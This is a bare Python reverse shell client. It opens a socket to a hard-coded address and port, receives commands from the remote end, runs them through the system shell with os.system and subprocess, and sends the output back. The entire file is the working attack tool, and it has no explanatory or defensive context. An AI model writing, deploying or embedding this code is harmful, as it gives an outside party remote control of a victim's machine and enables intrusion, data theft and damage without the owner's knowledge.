import socket
import os
import subprocess
ip="127.0.0.1"
port=8080 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.connect((ip, port))
while True:
    com=(s.recv(1024).decode())
    if com=="exit":
        s.close()
        break
    elif com.startswith("execute="):
        os.system(com[8:])
    else:
        proc = subprocess.Popen(com[4:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        op= proc.stdout.read()+proc.stderr.read()
        s.send(op)
